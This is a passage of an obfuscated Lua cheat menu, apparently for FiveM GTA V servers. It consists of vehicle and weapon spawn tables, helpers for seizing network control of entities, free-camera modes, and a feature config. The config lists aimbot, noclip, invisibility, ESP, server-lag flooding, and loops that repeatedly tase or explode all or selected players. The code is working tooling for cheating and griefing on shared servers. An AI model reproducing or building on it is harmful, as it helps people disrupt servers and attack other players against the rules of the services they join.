            {spawn = "amggtsmansory", name = "AMG GTS Mansory"},
            {spawn = "G63AMG6x6", name = "Brabus 6x6"},
            {spawn = "qx56", name = "Infinity QX56"},
            {spawn = "vantage", name = "Aston Martin Vantage"},
            {spawn = "svr16", name = "Range Rover Sport"},
            {spawn = "x6m", name = "BMW X6M"},
            {spawn = "a8lw12", name = "Audi A8L"},
            {spawn = "corvetteZR1", name = "Corvette ZR1"},
            {spawn = "720stc", name = "McLaren 720s"},
            {spawn = "TMODEL", name = "Tesla Model3"},
            {spawn = "kiagt", name = "Kia Stinger"},
            {spawn = "rs5r", name = "Audi RS5R"},
            {spawn = "R8v10", name = "Audi R8 V10"},
            {spawn = "cayenne", name = "Porsche Cayenne Turbo"},
            {spawn = "NISALTIMA", name = "Nissan Altima"},
            {spawn = "TR22", name = "Tesla Roadster"},
            {spawn = "Mb400", name = "Mercedes EQC400"},
            {spawn = "2020silv", name = "2020 Chevrolet Silverado"},
            {spawn = "foxrossa", name = "Ferrari 512 TR 1991"},
            {spawn = "M3E30", name = "BMW E30 M3"},
            {spawn = "foxharley2", name = "Harley Davidson"},
            {spawn = "foxharley1", name = "Harley Davidson Slimbob"},
            {spawn = "denalihd", name = "Denali"},
            {spawn = "fox600lt", name = "Mclaren 600LT 2020"},
            {spawn = "m6x6", name = "Mercedes 6X6 Geries Brabus AMG"},
            {spawn = "foxrover1", name = "Range Rover Evoque 2016"},
            {spawn = "tonkat", name = "Toyota Tonka Hilux"},
            {spawn = "kuga", name = "Ford Kuga"},
            {spawn = "silvias15", name = "Nissan Silvia S-15"},
            {spawn = "rx7rb", name = "Mazda RX7"},
            {spawn = "fto", name = "Mitsubishi FTO"},
            {spawn = "mr2sw20", name = "Toyota MR-2 GT"},
            {spawn = "eclipsegt06", name = "Mitsubishi Eclipse GT"},
            {spawn = "SkylineGTR", name = "SKYLINE GTR R34"},
            {spawn = "CAN", name = "Can AM"},
            {spawn = "2020ss", name = "2020 Chevrolet Camaro"},
            {spawn = "terzo", name = "Lamborghini Terzo"},
            {spawn = "rmodveneno", name = "Lamborghini Veneno"},
            {spawn = "gurkha", name = "Gang Insurgent"},
            {spawn = "p1", name = "2020 McLaren P1"},
            {spawn = "viper", name = "Viper SRT"},
            {spawn = "TypeR17", name = "Civic TypeR"},
            {spawn = "sc18", name = "Lamborghini SC18"},
            {spawn = "XJ", name = "Jaguar XJ"},
            {spawn = "lp700", name = "Lamborghini LP700"},
            {spawn = "TAMPA3", name = "Declasse Drift Tampa V2"},
            {spawn = "Huracan", name = "Lamborghini Huracan"},
            {spawn = "TESLAPD", name = "Tesla Model"},
            {spawn = "S63W222", name = "Mercedes S63"},
            {spawn = "foxct", name = "Tesla Cyber Truck"},
            {spawn = "foxsterrato", name = "Lamborghini Sterrato 2020"},
            {spawn = "foxsian", name = "Lamborghini Sian"},
            {spawn = "foxevo", name = "Huracan Evo"},
            {spawn = "foxsupra", name = "Toyota Supra GR 2020"},
            {spawn = "h3", name = "Hummer 3"},
            {spawn = "foxleggera", name = "Aston Martin  DBS"},
            {spawn = "rmodi8mlb", name = "BMW i8 Liberty Walk"},
            {spawn = "CORVETTE", name = "C7 Widebody"},
            {spawn = "slingshot", name = "slingshot"},
            {spawn = "f8rarri", name = "Ferrari F8"},
            {spawn = "forgiato", name = "Hellcat Charger Widebody"},
            {spawn = "ts1", name = "Zenvo TS1"},
            {spawn = "jeepg", name = "Jeep Gladiator"},
            {spawn = "GRANDGT18", name = "Porsche Panamera Sport"},
            {spawn = "2008f150", name = "2008 F150"},
            {spawn = "lccreaper", name = "LCC Reaper"},
            {spawn = "REMOWER", name = "LawnMower"},
            {spawn = "EVO10", name = "Lancer EVO"},
            {spawn = "vip8", name = "Dodge Viper"},
            {spawn = "ELLCHARG", name = "Ellie SuperCharged"},
            {spawn = "G770", name = "Lumma CLR G770"},
            {spawn = "IMPALASS2", name = "Chevrolet Impala 1964"},
            {spawn = "fox720s", name = "Mclaren 720s"},
            {spawn = "CHIRON", name = "Police Chiron"},
            {spawn = "polp1", name = "Police Mclaren P1"},
            {spawn = "AVENTADOR", name = "Police Aventador"},
            {spawn = "Custom", name = "Police R1 Bike"},
            {spawn = "CENTENARIO", name = "Police LP770"},
            {spawn = "Mustang", name = "Police Mustang"},
            {spawn = "rmodamgc63", name = "AMG C63"},
            {spawn = "audipd", name = "Police Audi"},
            {spawn = "MRAP", name = "Police MRAP"},
            {spawn = "CHIRON17", name = "Bugatti Chiron"},
            {spawn = "can", name = "Can AM"},
            {spawn = "rmodmustang", name = "Mustang"},
            {spawn = "beck", name = "F1 Type Car"},
            {spawn = "bugatti", name = "Bugatti Veyron"},
            {spawn = "foxezri", name = "Ferrari Xezri"},
            {spawn = "exgtr", name = "EX GTR"},
            {spawn = "f824slw", name = "Dandogg Car"},
            {spawn = "rculi", name = "Rolls Royce Cullinan"},
            {spawn = "raptor150", name = "Raptor F-150"},
            {spawn = "rs6c8", name = "Audi RS6"},
            {spawn = "ren_clio_5", name = "Renalt Clio V"},
            {spawn = "caprice13", name = "Chevrolet Caprice"},
            {spawn = "elantra07", name = "Hyundai Elantra"},
            {spawn = "familiac", name = "Mazda Familia"},
            {spawn = "trhawk", name = "Jeep TrackHawk"},
            {spawn = "ramlh20", name = "Dodge Ram Longhorn"},
            {spawn = "mach1", name = "Ford Mustang Mach 1"},
            {spawn = "cbr1000rrr", name = "Honda CBR1000RR"},
            {spawn = "rmodmi8lb", name = "Liberty Walk i8"},
            {spawn = "Skyline", name = "Nissan Skyline GTR"},
            {spawn = "boss302", name = "Ford Mustang Boss 302"},
            {spawn = "exc530", name = "KTM EXC 530"},
            {spawn = '20x5m', name = "BMW X5M"},
            {spawn = 'thekart', name = 'Go Kart'},
            {spawn = 'rmodm4', name = 'BMW M4'},
            {spawn = 'rmodx6', name = 'BMW X6'},
            {spawn = 'x5m', name = 'BMW X5M'},
            {spawn = 'bcps', name = 'Bugatti Chrion'},
            {spawn = 'bdivo', name = 'Bugatti Divo'},
            {spawn = 'aperta', name = 'Ferrari Laferrari Aperta'},
            {spawn = 'f40', name = 'Ferrari F40'},
            {spawn = 'eltransit', name = 'Ford Transit'},
            {spawn = 'explorer20', name = 'Ford Explorer'},
            {spawn = 'mclarengt', name = 'McLaren GT'},
            {spawn = '720s', name = 'McLaren 720s'},
            {spawn = 'amggtc', name = 'Mercedes AMG GTC'},
            {spawn = 'arrow', name = 'Mercedes Arrow'},
            {spawn = 'brabus850', name = 'Brabus 850'},
            {spawn = 'e63amg', name = 'Mercedes E63 AMG'},
            {spawn = 'nissantitan17', name = 'Nissan Titan'},
            {spawn = 'cayenneturbo', name = 'Porche Cayenne Turbo'},
            {spawn = 'golfgti', name = 'Volkswagon Golf GTI'},
            {spawn = 'q8prior', name = 'Audi Q8'},
            {spawn = 'rs666', name = 'Audi RS6'},
            {spawn = '190e',  name = 'Mercedes 190E'},
            {spawn = 'golfmk7', name = 'Volkswagon Golf Mk7'},
            {spawn = 'rmodjeep', name = 'Jeep Wrangler?'},
            {spawn = 'raid', name = 'Doge Challenger Raid'},
            {spawn = 'bentaygast', name = 'Bently Bentayga'},
            {spawn = 'st', name = 'Ford Feista'},
            {spawn = "gtr", name = "Nissan GTR r35"},
            {spawn = "19dbs", name = "2019 Aston Martin DBS"},
            {spawn = "16challenger", name = "2016 challenger"},
            {spawn = "450crf", name = "Honda 450CRF"},
            {spawn = "911", name = "Porshe 911"},
            {spawn = "amggtsprior", name = "Mercedes AMG GTS Prior"},
            {spawn = "lb750sv", name = "Lamborghini Aventador LB750SV"},
            {spawn = "rculi", name = "Rolls Royce Cullian"},
            {spawn = "raptor150", name = "Ford Raptor"},
            {spawn = "ren_clio_5", name = "Renault Clio"},
            {spawn = "caprice13", name = "Chevrolet Caprice"},
            {spawn = "elantra07", name = "20017 Hyundai Elantra"},
            {spawn = "familiac", name = "Mazda Familia"},
            {spawn = "lp770", name = "Lamborghini Centenario"},
            {spawn = "brz", name = "Subaru Brz"},
            {spawn = "agera", name = "Koenigsegg Agera"},
            {spawn = "cbr1000", name = "Honda CBR 1000RR"},
            {spawn = "g500", name = "Mercedes G500"},
            {spawn = "h2carb", name = "2017 Kawasaki H2 Carbon"},
            {spawn = "ar8lb", name = "Liberty Walk BMW I8"},
            {spawn = "g63mg", name = "Mercedes AMG G63"},
            {spawn = "scaldarsi", name = "Scaldarsi Emperor"},
            {spawn = "db11", name = "Aston Martin DB11"},
            {spawn = "f82", name = "BMW M4"},
            {spawn = "g63", name = "Mercedes G63"},
            {spawn = "gt63", name = "Mercedes GT 63"},
            {spawn = "rmodamgc63", name = "Mercedes AMG c63"},
            {spawn = "rmodx6", name = "BMW X6"},
            {spawn = "x5m", name = "BMW X5"},
            {spawn = "rs666", name = "Widebody Audi RS6"},
            {spawn = "golfmk7", name = "VW Golf MK7"},
            {spawn = "rmodmustang", name = "Ford Mustang"},
            {spawn = "rmodrs6", name = "Audi rs6"},
            {spawn = "golfmk7", name = "VW Golf MK7"},
            {spawn = "corvettezr1", name = "Corvette C7 ZR1"},
            {spawn = "bmwm8", name = "BMW M8"},
            {spawn = "vantage", name = "Aston Martin Vantage"},
            {spawn = "04acuratsx", name = "2004 Acura STX"},
            {spawn = "180sx", name = "Nissan 180sx"},
            {spawn = "18performante", name = "2018 Lamborghini Performante"},
            {spawn = "95stang", name = "1995 Ford Mustang"},
            {spawn = "countach", name = "Lamborghini Countach"},
            {spawn = "cyrus", name = "Aston Martin Cyrus"},
            {spawn = "czr2", name = "Chevrolet Colorado ZR2"},
            {spawn = "dbs2009", name = "2009 Aston Martin DBS"},
            {spawn = "f812", name = "Ferrari F812 Superfast"},
            {spawn = "fairlane66", name = "1966 Ford Fairlane"},
            {spawn = "cesc21", name = "Cadillac Escalade"},
            {spawn = "aimgainnsx", name = "AimGain's Acura NSX"},
            {spawn = "745le", name = "BMW 745le M Sport"},
            {spawn = "gmt900escal", name = "GMT Escalade"},
            {spawn = "e30t", name = "BMW E3 e30t"},
            {spawn = "m2f22", name = "BMW M2"},
            {spawn = "rmodm4gts", name = "BMW M4 GTS"},
            {spawn = "rmodm8gte", name = "BMW M8 GTE"},
            {spawn = "69charger", name = "1969 Dodge Charger"},
            {spawn = "rmodchiron300", name = "Bugatti Chiron"},
            {spawn = "rmodbugatti", name = "Bugatti Veyron"},
            {spawn = "rmodzl1", name = "Camaro ZL1"},
            {spawn = "velociraptor", name = "Ford velociraptor"},
            {spawn = "m82020", name = "2020 BMW M8"},
            {spawn = "golfmk6", name = "VW Golf mk6"},
            {spawn = "718caymans", name = "Porshe Cayman S 718"},
        },
        CustomWeps = {
            {spawn = 'weapon_guitarcmg', name = 'Air Guitar'},
            {spawn = 'weapon_sigcmg', name = 'Cig 516'},
            {spawn = 'weapon_ump45cmg', name = 'UMP 45'},
            {spawn = 'weapon_m110cmgg', name = 'm110'},
            {spawn = 'weapon_augcmg', name = 'AUG'},
            {spawn = 'weapon_ar18cmg', name = 'Ar18'},
            {spawn = 'weapon_ak12cmg', name = 'AK12'},
            {spawn = 'weapon_ak74kashnarcmg', name = 'AK47'},
            {spawn = 'weapon_akdragoncmg', name = 'AK Dragon'},
            {spawn = 'weapon_ak74cmg', name = 'AK74'},
            {spawn = 'weapon_vespercmg', name = 'Vesper'},
            {spawn = 'weapon_mtarcmg', name = 'MTAR'},
            {spawn = 'weapon_nv4', name = 'nv4 Flatline'},
            {spawn = 'weapon_mp40', name = 'MP40'},
            {spawn = 'weapon_sigmpx', name = 'SIG MPX'},
            {spawn = 'weapon_lvoaccmg', name = 'LVOA'},
            {spawn = 'weapon_fnfalcmg', name = 'FNFAL'},
            {spawn = 'weapon_r5', name = 'Remington R5'},
            {spawn = 'weapon_m4a1cmg', name = 'M4A1'},
            {spawn = 'weapon_hkg3cmg', name = 'HKG3'},
            {spawn = 'weapon_sigmcxcmg', name = 'Sig MCX'},
            {spawn = 'weapon_acrcmg', name = 'ACR'},
            {spawn = 'weapon_hk416cmg', name = 'HK416'},
            {spawn = 'weapon_m16vncmg', name = 'M16'},
            {spawn = 'weapon_taccmg', name = 'Tac'},
            {spawn = 'weapon_scarcmg', name = 'Scar'},
            {spawn = 'Weapon_scarlcmg', name = 'Scar L'},
            {spawn = 'weapon_ppshcmg', name = 'PPSH'},
            {spawn = 'weapon_barretcmg', name = 'Barret'},
            {spawn = 'weapon_msr', name = 'MSR'},
            {spawn = 'weapon_m200cmg', name = 'M200'},
            {spawn = 'weapon_remington870cmg', name = 'Remington 870'},
            {spawn = 'weapon_winchester12cmg', name = 'Winchester 12'},
            {spawn = 'weapon_mosincmg', name = 'Mosin'},
        },
        RotationToDirection = function(rotation)
            return RfPsUKHSFWJuBEJuz.rE.LumVector3(-RfPsUKHSFWJuBEJuz.rE.LumMath.LumSin(RfPsUKHSFWJuBEJuz.rE.LumMath.LumRad(rotation.z))*RfPsUKHSFWJuBEJuz.rE.LumMath.LumAbs(RfPsUKHSFWJuBEJuz.rE.LumMath.LumCos(RfPsUKHSFWJuBEJuz.rE.LumMath.LumRad(rotation.x))), RfPsUKHSFWJuBEJuz.rE.LumMath.LumCos(RfPsUKHSFWJuBEJuz.rE.LumMath.LumRad(rotation.z))*RfPsUKHSFWJuBEJuz.rE.LumMath.LumAbs(RfPsUKHSFWJuBEJuz.rE.LumMath.LumCos(RfPsUKHSFWJuBEJuz.rE.LumMath.LumRad(rotation.x))), RfPsUKHSFWJuBEJuz.rE.LumMath.LumSin(RfPsUKHSFWJuBEJuz.rE.LumMath.LumRad(rotation.x)))
        end,
        RequestelControl = function(entity)
            if nlFXKkFxuKQAk.natives.NetworkHasControlOfEntity(entity) then 
                return true 
            end
            nlFXKkFxuKQAk.natives.SetNetworkIdCanMigrate(nlFXKkFxuKQAk.natives.NetworkGetNetworkIdFromEntity(entity), true)
            return nlFXKkFxuKQAk.natives.NetworkRequestControlOfEntity(entity)
        end,
        GetSeatPedIsIn = function(ped) 
            if not nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(ped, false) then 
                return 
            else veh = nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(ped) 
                for i = 0, nlFXKkFxuKQAk.natives.GetVehicleMaxNumberOfPassengers(veh) do 
                    if nlFXKkFxuKQAk.natives.GetPedInVehicleSeat(veh) then
                        return i 
                    end 
                end 
            end 
        end,
        GetCamDir = function()
            local heading = nlFXKkFxuKQAk.natives.GetGameplayCamRelativeHeading() + nlFXKkFxuKQAk.natives.GetEntityHeading(nlFXKkFxuKQAk.natives.PlayerPedId()) 
            local pitch = nlFXKkFxuKQAk.natives.GetGameplayCamRelativePitch()
            local x = -RfPsUKHSFWJuBEJuz.rE.LumMath.LumSin(heading * RfPsUKHSFWJuBEJuz.rE.LumMath.LumPi / 180.0) 
            local y = RfPsUKHSFWJuBEJuz.rE.LumMath.LumCos(heading * RfPsUKHSFWJuBEJuz.rE.LumMath.LumPi / 180.0) 
            local z = RfPsUKHSFWJuBEJuz.rE.LumMath.LumSin(pitch * RfPsUKHSFWJuBEJuz.rE.LumMath.LumPi / 180.0) 
            local len = RfPsUKHSFWJuBEJuz.rE.LumMath.LumSqrt(x * x + y * y + z * z) 
            if len ~= 0 then 
                x = x / len y = y / len z = z / len 
            end
            return x, y, z 
        end,
        DrawTextOnCoords = function(x, y, z, text, r, g, b)
            nlFXKkFxuKQAk.natives.SetDrawOrigin(x, y, z, 0)
            nlFXKkFxuKQAk.natives.SetTextFont(0)
            nlFXKkFxuKQAk.natives.SetTextProportional(0)
            nlFXKkFxuKQAk.natives.SetTextScale(0.0, 0.20)
            nlFXKkFxuKQAk.natives.SetTextColour(r, g, b, 255)
            nlFXKkFxuKQAk.natives.SetTextDropshadow(0, 0, 0, 0, 255)
            nlFXKkFxuKQAk.natives.SetTextEdge(2, 0, 0, 0, 150)
            nlFXKkFxuKQAk.natives.SetTextOutline()
            nlFXKkFxuKQAk.natives.SetTextEntry("STRING")
            nlFXKkFxuKQAk.natives.SetTextCentre(1)
            nlFXKkFxuKQAk.natives.AddTextComponentString(text)
            nlFXKkFxuKQAk.natives.DrawText(0.0, 0.0)
            nlFXKkFxuKQAk.natives.ClearDrawOrigin()
        end,
        finderkek = function(initFunc, moveFunc, disposeFunc)
            return RfPsUKHSFWJuBEJuz.rE.LumRoutine.LumWrap(function() 		
                local iter, id = initFunc() 		
                if not id or id == 0 then 			
                    disposeFunc(iter) 			
                    return 		
                end 		
                local enum = {handle = iter, destructor = disposeFunc} 		
                RfPsUKHSFWJuBEJuz.rE.LumMetaTable(enum, entityEnumerator) 		
                local next = true 		
                repeat RfPsUKHSFWJuBEJuz.rE.LumRoutine.LumYeild(id) next, id = moveFunc(iter) until 
                not next enum.destructor, enum.handle = nil, nil disposeFunc(iter) 
            end) 	
        end,
        translatesprite = function(sw)
            local px = sw / 80
            local px2 = 16 * px
            return (sw - px2) / 2
        end,
        insidecircle = function(cx, cy, rad, isx, isy)
            local distance = RfPsUKHSFWJuBEJuz.rE.LumMath.LumSqrt((isx - cx)^2 + (isy - cy)^2)
            if distance <= rad then
                return true
            else
                return false
            end
        end,
        isanykey = function()
            for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(RfPsUKHSFWJuBEJuz.Keys) do
                if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(0, v) then
                    return v, k
                end
            end
        end,
        RGBRainbow = function(frequency)
            local result = {}
            local curtime = nlFXKkFxuKQAk.natives.GetGameTimer() / 1000
        
            result.r = RfPsUKHSFWJuBEJuz.rE.LumMath.LumFloor(RfPsUKHSFWJuBEJuz.rE.LumMath.LumSin(curtime * frequency + 0) * 127 + 128)
            result.g = RfPsUKHSFWJuBEJuz.rE.LumMath.LumFloor(RfPsUKHSFWJuBEJuz.rE.LumMath.LumSin(curtime * frequency + 2) * 127 + 128)
            result.b = RfPsUKHSFWJuBEJuz.rE.LumMath.LumFloor(RfPsUKHSFWJuBEJuz.rE.LumMath.LumSin(curtime * frequency + 4) * 127 + 128)
        
            return result
        end,
        table_removekey = function(array, element, ab) 
            if ab then
                for i = 1, #array do
                    if i > #array then
                        return
                    end
                    if array[i][1] == element then 
                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumRemove(array, i) 
                    end
                end
            else
                for i = 1, #array do 
                    if array[i] == element then 
                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumRemove(array, i) 
                    end 
                end 
            end
        end,
        Random_stringcontains = function(table, element, ab)
            if ab then
                for _, value in RfPsUKHSFWJuBEJuz.rE.Lumpairs(table) do
                    if value[1] == element then
                        return true
                    end
                end
                return false
            else
                for _, value in RfPsUKHSFWJuBEJuz.rE.Lumpairs(table) do
                    if value == element then
                        return true
                    end
                end
                return false
            end
        end,
        addsomevectors = function(vect1, vect2) 	
            return RfPsUKHSFWJuBEJuz.rE.LumVector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z) 
        end,
        subtractsomevectors = function(vect1, vect2) 	
            return RfPsUKHSFWJuBEJuz.rE.LumVector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z) 
        end,
        scalesomevectors = function(vect, mult) 	
            return RfPsUKHSFWJuBEJuz.rE.LumVector3(vect.x * mult, vect.y * mult, vect.z * mult) 
        end,
    },
    dynam = {
        GetResources = function()
            local resources = {}
            for i=0, nlFXKkFxuKQAk.natives.GetNumResources() do
                resources[i] = nlFXKkFxuKQAk.natives.GetResourceByFindIndex(i)
            end
            return resources
        end,
        GetResourceStatus = function(resource_name)
            if nlFXKkFxuKQAk.natives.GetResourceState(resource_name) == "started" or 
                RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(nlFXKkFxuKQAk.natives.GetResourceState(resource_name)) == "started" or 
                RfPsUKHSFWJuBEJuz.rE.LumString.LumLower(nlFXKkFxuKQAk.natives.GetResourceState(resource_name)) == "started" then
                return true
            else
                return false
            end
        end
    },
    freec = {
        FCInstruc = function(meth)
            local NewHELPV1 = { }
            
        
            local NewHELPV2

                if meth == 1 then
                    NewHELPV2 = {
                        {
                            ["label"] = "Speed Up",
                            ["button"] = "~INPUT_VEH_MOVE_UP_ONLY~"
                        },
                        {
                            ['label'] = '',
                            ['button'] = "~INPUT_WEAPON_WHEEL_PREV~"
                        },
                        {
                            ["label"] = "Toggle Mode",
                            ["button"] = "~INPUT_WEAPON_WHEEL_NEXT~"
                        }
                        
                    }
                elseif meth == 2 then
                    NewHELPV2 = {
                        {
                            ['label'] = 'Teleport',
                            ['button'] = "~INPUT_ATTACK~"
                        },
                        {
                            ['label'] = '',
                            ['button'] = "~INPUT_WEAPON_WHEEL_PREV~"
                        },
                        {
                            ["label"] = "Toggle Mode",
                            ["button"] = "~INPUT_WEAPON_WHEEL_NEXT~"
                        }
                    }
                elseif meth == 3 then
                    NewHELPV2 = {
                        {
                            ['label'] = 'Spawn',
                            ['button'] = "~INPUT_ATTACK~"
                        },
                        {
                            ["label"] = 'Change Spawn Modes',
                            ['button'] = "~INPUT_AIM~"
                        },
                        {
                            ['label'] = '',
                            ['button'] = "~INPUT_WEAPON_WHEEL_PREV~"
                        },
                        {
                            ["label"] = "Toggle Mode",
                            ["button"] = "~INPUT_WEAPON_WHEEL_NEXT~"
                        }
                    }
                elseif meth == 4 then
                    NewHELPV2 = {
                        {
                            ['label'] = 'Attach',
                            ['button'] = "~INPUT_ATTACK~"
                        },
                        {
                            ["label"] = 'Change Object To Attach',
                            ['button'] = "~INPUT_AIM~"
                        },
                        {
                            ['label'] = '',
                            ['button'] = "~INPUT_WEAPON_WHEEL_PREV~"
                        },
                        {
                            ["label"] = "Toggle Mode",
                            ["button"] = "~INPUT_WEAPON_WHEEL_NEXT~"
                        }
                    }
                elseif meth == 5 then
                    NewHELPV2 = {
                        {
                            ['label'] = 'Delete',
                            ['button'] = "~INPUT_ATTACK~"
                        },
                        {
                            ['label'] = '',
                            ['button'] = "~INPUT_WEAPON_WHEEL_PREV~"
                        },
                        {
                            ["label"] = "Toggle Mode",
                            ["button"] = "~INPUT_WEAPON_WHEEL_NEXT~"
                        },
                    }
                elseif meth == 6 then
                    NewHELPV2 = {
                        {
                            ['label'] = 'Shoot',
                            ['button'] = "~INPUT_ATTACK~"
                        },
                        {
                            ["label"] = 'Change Weapon',
                            ['button'] = "~INPUT_AIM~"
                        },
                        {
                            ['label'] = '',
                            ['button'] = "~INPUT_WEAPON_WHEEL_PREV~"
                        },
                        {
                            ["label"] = "Toggle Mode",
                            ["button"] = "~INPUT_WEAPON_WHEEL_NEXT~"
                        }
                    }
                elseif meth == 7 then
                    NewHELPV2 = {
                        {
                            ['label'] = 'Play Effect',
                            ['button'] = "~INPUT_ATTACK~"
                        },
                        {
                            ['label'] = '',
                            ['button'] = "~INPUT_WEAPON_WHEEL_PREV~"
                        },
                        {
                            ["label"] = "Toggle Mode",
                            ["button"] = "~INPUT_WEAPON_WHEEL_NEXT~"
                        },
                    }
                elseif meth == 8 then
                    NewHELPV2 = {
                        {
                            ['label'] = 'Spawn',
                            ['button'] = "~INPUT_ATTACK~"
                        },
                        {
                            ["label"] = 'Object Type',
                            ['button'] = "~INPUT_AIM~"
                        },
                        {
                            ["label"] = 'Object',
                            ['button'] = "~INPUT_TALK~"
                        },
                        {
                            ['label'] = '',
                            ['button'] = "~INPUT_WEAPON_WHEEL_PREV~"
                        },
                        {
                            ["label"] = "Toggle Mode",
                            ["button"] = "~INPUT_WEAPON_WHEEL_NEXT~"
                        },
                    }
                elseif meth == 9 then
                    NewHELPV2 = {
                        {
                            ['label'] = 'Hold To Move',
                            ['button'] = "~INPUT_ATTACK~"
                        },
                        {
                            ['label'] = '',
                            ['button'] = "~INPUT_WEAPON_WHEEL_PREV~"
                        },
                        {
                            ["label"] = "Toggle Mode",
                            ["button"] = "~INPUT_WEAPON_WHEEL_NEXT~"
                        },
                    }
                elseif meth == 10 then
                    NewHELPV2 = {
                        {
                            ['label'] = 'Copy Entity',
                            ['button'] = "~INPUT_ATTACK~"
                        },
                        {
                            ['label'] = 'Paste Entity',
                            ['button'] = "~INPUT_AIM~"
                        },
                        {
                            ['label'] = '',
                            ['button'] = "~INPUT_WEAPON_WHEEL_PREV~"
                        },
                        {
                            ["label"] = "Toggle Mode",
                            ["button"] = "~INPUT_WEAPON_WHEEL_NEXT~"
                        },
                    }
                elseif meth == 11 then
                    NewHELPV2 = {
                        {
                            ['label'] = 'Take Control',
                            ['button'] = "~INPUT_ATTACK~"
                        },
                        {
                            ['label'] = 'Release',
                            ['button'] = "~INPUT_RELOAD~"
                        },
                        {
                            ['label'] = 'Change Camera',
                            ['button'] = "~INPUT_DIVE~"  
                        },
                        {
                            ['label'] = '',
                            ['button'] = "~INPUT_WEAPON_WHEEL_PREV~"
                        },
                        {
                            ["label"] = "Toggle Mode",
                            ["button"] = "~INPUT_WEAPON_WHEEL_NEXT~"
                        },
                    }
                end
        
                for NewHELPV5 = 1, #NewHELPV1 do
                    local NewHELPV3 = NewHELPV1[NewHELPV5]
        
                    RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(NewHELPV2, NewHELPV3)
                end
        
                RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                local NewHELPV4 = nlFXKkFxuKQAk.natives.RequestScaleformMovie("instructional_buttons")
        
                while not nlFXKkFxuKQAk.natives.HasScaleformMovieLoaded(NewHELPV4) do
                    RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                end
        
                nlFXKkFxuKQAk.natives.PushScaleformMovieFunction(NewHELPV4, "CLEAR_ALL")
                nlFXKkFxuKQAk.natives.PushScaleformMovieFunction(NewHELPV4, "TOGGLE_MOUSE_BUTTONS")
                nlFXKkFxuKQAk.natives.PushScaleformMovieFunctionParameterBool(0)
                nlFXKkFxuKQAk.natives.PopScaleformMovieFunctionVoid()
        
                for NewHELPV5, NewHELPV6 in RfPsUKHSFWJuBEJuz.rE.LumIpairs(NewHELPV2) do
                    nlFXKkFxuKQAk.natives.PushScaleformMovieFunction(NewHELPV4, "SET_DATA_SLOT")
                    nlFXKkFxuKQAk.natives.PushScaleformMovieFunctionParameterInt(NewHELPV5 - 1)
                    nlFXKkFxuKQAk.natives.PushScaleformMovieMethodParameterButtonName(NewHELPV6["button"])
                    nlFXKkFxuKQAk.natives.PushScaleformMovieFunctionParameterString(NewHELPV6["label"])
                    nlFXKkFxuKQAk.natives.PopScaleformMovieFunctionVoid()
                end
        
                nlFXKkFxuKQAk.natives.PushScaleformMovieFunction(NewHELPV4, "DRAW_INSTRUCTIONAL_BUTTONS")
                nlFXKkFxuKQAk.natives.PushScaleformMovieFunctionParameterInt(-1)
                nlFXKkFxuKQAk.natives.PopScaleformMovieFunctionVoid()
                nlFXKkFxuKQAk.natives.DrawScaleformMovieFullscreen(NewHELPV4, 255, 255, 255, 255)
            end)
        end,
        RotToDir2 = function(rotation)	
            local adjustedRotation = 	{ 		x = (RfPsUKHSFWJuBEJuz.rE.LumMath.LumPi / 180) * rotation.x, 		y = (RfPsUKHSFWJuBEJuz.rE.LumMath.LumPi / 180) * rotation.y, 		z = (RfPsUKHSFWJuBEJuz.rE.LumMath.LumPi / 180) * rotation.z 	}	
            local direction = 	{		x = -RfPsUKHSFWJuBEJuz.rE.LumMath.LumSin(adjustedRotation.z) * RfPsUKHSFWJuBEJuz.rE.LumMath.LumAbs(RfPsUKHSFWJuBEJuz.rE.LumMath.LumCos(adjustedRotation.x)), 		y = RfPsUKHSFWJuBEJuz.rE.LumMath.LumCos(adjustedRotation.z) * RfPsUKHSFWJuBEJuz.rE.LumMath.LumAbs(RfPsUKHSFWJuBEJuz.rE.LumMath.LumCos(adjustedRotation.x)), 		z = RfPsUKHSFWJuBEJuz.rE.LumMath.LumSin(adjustedRotation.x)	}	
            return direction 
        end,
        RotToQuat = function(rot)
        
            local pitch = RfPsUKHSFWJuBEJuz.rE.LumMath.LumRad(rot.x)
            local roll  = RfPsUKHSFWJuBEJuz.rE.LumMath.LumRad(rot.y)
            local yaw   = RfPsUKHSFWJuBEJuz.rE.LumMath.LumRad(rot.z)
            
                local cy = RfPsUKHSFWJuBEJuz.rE.LumMath.LumCos(yaw   * 0.5)
            local sy = RfPsUKHSFWJuBEJuz.rE.LumMath.LumSin(yaw   * 0.5)
            local cr = RfPsUKHSFWJuBEJuz.rE.LumMath.LumCos(roll  * 0.5)
            local sr = RfPsUKHSFWJuBEJuz.rE.LumMath.LumSin(roll  * 0.5)
            local cp = RfPsUKHSFWJuBEJuz.rE.LumMath.LumCos(pitch * 0.5)
            local sp = RfPsUKHSFWJuBEJuz.rE.LumMath.LumSin(pitch * 0.5)
        
            return quat(
                cy * cr * cp + sy * sr * sp,
                cy * sp * cr - sy * cp * sr, 
                cy * cp * sr + sy * sp * cr, 
                sy * cr * cp - cy * sr * sp  
            )
        
        end
    },
    config = {
        features = {
            IONFCH = false,
            SpeedRoon = false,
            SupaStamina = false,
            SupaJesusMode = false,
            SupaNoSee = false,
            SupaJumpski = false,
            ShowMouseC = false,
            elnomove = false,
            vehicularjesus = false,
            vehicularnosee = false,
            UnderGC = false,
            GunNevaStop = false,
            Gungokaboom = false,
            GunGoMoverino = false,
            GunGoTrace = false,
            NoRecoil = false,
            ToggleFreeCam = false,
            Noclip = false,
            UnderWaterCar = false,
            kewlplaterino = false,
            ezdrove = false,
            SpedBoostman = false,
            AimbotM = false,
            ABTargetPed = false,
            ABTargetPlayers = false,
            ABDrawFOV = false,
            ABDrawT = false,
            ABNeedLOS = false,
            Serverlagveh = false,
            Serverlagani = false,
            tazeloopall = false,
            udboomall = false,
            wptoselp = false,
            tazeloopselp = false,
            boomloopselp = false,
            PBlips = false,
            Alwaysbright = false,
            Crosshair = false,
            NoRain = false,
            RBM = false,
            gayesp = false,
            gayespid = false,
